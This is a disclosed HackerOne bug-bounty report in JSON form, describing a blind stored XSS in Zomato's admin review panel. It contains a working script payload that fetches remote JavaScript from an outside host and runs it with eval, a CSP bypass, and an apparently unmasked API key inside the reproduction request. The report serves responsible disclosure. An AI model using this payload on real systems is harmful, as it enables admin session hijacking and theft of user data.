{"id":314126,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTQxMjY=","url":"https://hackerone.com/reports/314126","title":"Blind XSS - Report review - Admin panel","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-02-09T08:29:03.069Z","submitted_at":"2018-02-09T08:29:03.069Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gerben_javado","url":"/gerben_javado","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-29T17:45:40.493Z","bug_reporter_agreed_on_going_public_at":"2018-03-29T13:41:29.357Z","team_member_agreed_on_going_public_at":"2018-03-29T17:45:40.232Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Introduction\nIn the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on https://www.zomato.com████████/reviews_new?review_id={ID}. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using `XMLHttpRequest`.\n\n#Steps to reproduce\n1. Replace the `X-Access-Token` to your access token and the `review_id` to a review you can report.\n2. Send the request in Burp\n3. Go to https://www.zomato.com██████████/reviews_new?review_id={ID}\n4. XSS payload executes\n\n```http\nPOST /v2/█████merchant HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 485\nHost: api.zomato.com\nX-Zomato-API-Key: a2cf52f6036511e48be6b2227cce2b54\nX-Access-Token: dc5da████████ad0fdddff04\nX-Client-Id: zomato_merchantandroid_v2\n\nreason_id=5\u0026review_id=32288944\u0026additional_text=\u003cscript\u003efunction b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//ks.xss.ht\");a.send();\u003c/script\u003e\n```\n\n#Screenshot Admin Panel\n{█████}\n\n#Dom Snippet\n```html\n \u003cu\u003eReported by Merchant(ID)\u003c/u\u003e : \u003ca style=\"opacity: 1; color: #000000; text-decoration:underline\" href=\"https://www.zomato.com/users/43211589\"\u003e43211589\u003c/a\u003e\u003cbr\u003e\u003cu\u003eReport Reason ID\u003c/u\u003e : 5 (Other (mention reason below).)\u003cbr\u003e\u003cu\u003eAdditional Text\u003c/u\u003e : H\nH\nH\nH\nH\n''\"\u0026gt;\u003cscript\u003efunction b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//ks.xss.ht\");a.send();\u003c/script\u003e\n```\n\n## Impact\n\nAn attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://www.zomato.com██████████/reviews_new\n\n**Verified**\nYes\n\n","bounty_amount":"350.0","formatted_bounty":"$350","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-04-28T13:41:29.414Z","allow_singular_disclosure_after":-109040536.79502043,"singular_disclosure_allowed":true,"vote_count":37,"voters":["sp1d3rs","europa","ramsexy","muon4","sameerphad72","spam404","s_p_q_r","flashdisk","ali","1337fenrir","and 27 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2369727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there @gerben_javado  - thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you.","automated_response":false,"created_at":"2018-02-10T00:49:21.369Z","updated_at":"2018-02-10T00:49:21.369Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2476651,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-03-09T10:28:21.770Z","updated_at":"2018-03-09T10:28:21.770Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"gerben_javado","url":"/gerben_javado"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2542772,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-03-29T06:38:16.434Z","updated_at":"2018-03-29T06:38:16.434Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zomato"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"100.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"gerben_javado","url":"/gerben_javado"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544185,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-03-29T13:41:29.385Z","updated_at":"2018-03-29T13:41:29.385Z","first_to_agree":true,"actor":{"username":"gerben_javado","cleared":false,"url":"/gerben_javado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544827,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-03-29T17:43:25.077Z","updated_at":"2018-03-29T17:43:25.077Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":117110,"new_severity_id":133687},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544837,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks @gerben_javado for helping us in keeping @zomato secure :)\n\nCheers.","automated_response":false,"created_at":"2018-03-29T17:45:40.265Z","updated_at":"2018-03-29T17:45:40.265Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544838,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-03-29T17:45:40.525Z","updated_at":"2018-03-29T17:45:40.525Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}